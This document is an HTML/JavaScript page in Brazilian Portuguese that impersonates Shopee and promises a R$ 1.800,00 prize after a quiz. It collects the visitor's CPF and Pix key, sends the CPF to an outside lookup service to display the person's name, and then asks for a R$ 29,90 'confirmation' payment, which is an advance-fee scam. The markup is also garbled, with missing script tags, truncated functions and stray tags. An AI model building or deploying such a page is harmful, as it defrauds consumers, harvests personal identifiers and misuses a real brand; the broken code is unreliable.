<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Shopee Quiz – Ganhe R$ 1.800,00</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
:root{--shopee:#ff5722;--shopee-dark:#e64a19;--verde:#4caf50}
*{box-sizing:border-box;margin:0;padding:0;font-family:"Segoe UI",Roboto,Helvetica,sans-serif}
body{background:#fff5f1}
header{background:var(--shopee);color:#fff;padding:14px;text-align:center;font-size:20px;font-weight:700}
.bar{width:100%;height:6px;background:#ffe0d6}
.bar>div{height:6px;background:#fff;transition:width .3}
.quiz-box{max-width:420px;margin:20px auto;background:#fff;border-radius:12px;box-shadow:0 4px 14px rgba(0,0,0,.12);padding:18px}
.produto{display:flex;align-items:center;margin-bottom:14px;border:1px solid #ffe0d6;border-radius:10px;padding:10px;cursor:pointer;transition:.2s}
.produto img{width:80px;height:80px;object-fit:cover;border-radius:8px;margin-right:12px}
.produto:hover{border-color:var(--shopee)}
.preco{font-size:18px;font-weight:700;color:var(--shopee)}
.btn{background:var(--shopee);color:#fff;border:none;width:100%;padding:14px;border-radius:8px;font-size:18px;font-weight:700;cursor:pointer}
.btn:active{transform:scale(.98)}
.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;z-index:999}
.popup-content{background:#fff;padding:24px;border-radius:14px;text-align:center;max-width:320px}
.coin-sound{width:0;height:0;overflow:hidden}
.valor-popup{font-size:26px;color:var(--verde);font-weight:700}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:8px}
.hidden{display:none}
.resumo{background:#f9f9f9;border:1px solid #ddd;border-radius:8px;padding:12px;margin-top:12px;font-size:14px}
</style>
</head>
<body>
<header><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 24'%3E%3Cpath fill='%23fff' d='M30 6h8v12h-8zm10 0h8v12h-8zm-20 0h8v12h-8z'/%3E%3Ctext x='0' y='18' fill='%23fff' font-size='18' font-weight='700'%3EShopee%3C/text%3E%3C/svg%3E" height="24"></header>
<div class="bar"><div id="prog"></div></div>

<!-- Tela 1 – Quiz -->
<div id="quiz" class="quiz-box">
<div id="pergunta"></div>
<div id="lista"></div>
</div>

<!-- Tela 2 – Pix -->
<div id="pix" class="quiz-box hidden">
<h3>Confirme seus dados para receber R$ 1.800,00</h3>
<input id="cpf" placeholder="CPF (somente números)" maxlength="11">
<input id="chave" placeholder="Sua chave Pix (CPF, e-mail ou cel)">
<button class="btn" onclick="puxarDados()">Validar dados</button>
</div>

<!-- Tela 3 – Comprovante -->
<div id="comp" class="quiz-box hidden">
<div id="resumo" class="resumo"></div>
<p style="margin-top:10px">É este mesmo o destino do seu Pix de <b>R$ 1.800,00</b>?</p>
<button class="btn" onclick="finalizar()">Confirmar &nbsp;&nbsp;R$ 29,90</button>
<//style>
</div>

<!-- Popup -->
<div id="popup" class="popup">
<div class="popup-content">
<audio id="coin" src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="></audio>

</div>

function fecharPopup(){

function puxarDados(){
const cpf=document.getElementById('cpf').value;
const chave=document.getElementById('chave').value;
if(cpf.length!==11||!chave){alert('Preencha corretamente');return;}
fetch(`https://api-publica.speedio.com.br/buscarcnpj?cnpj=${cpf}`).then(r=>r.json()).then(d=>{
document.getElementById('resumo').innerHTML=`
<div><b>Nome:</b> ${d.nome||'Cliente Shopee'}</div>
<div><b>CPF:</b> ${cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4')}</div>
<div><b>Chave Pix:</b> ${chave}</div>

`;

}).catch(()=>{
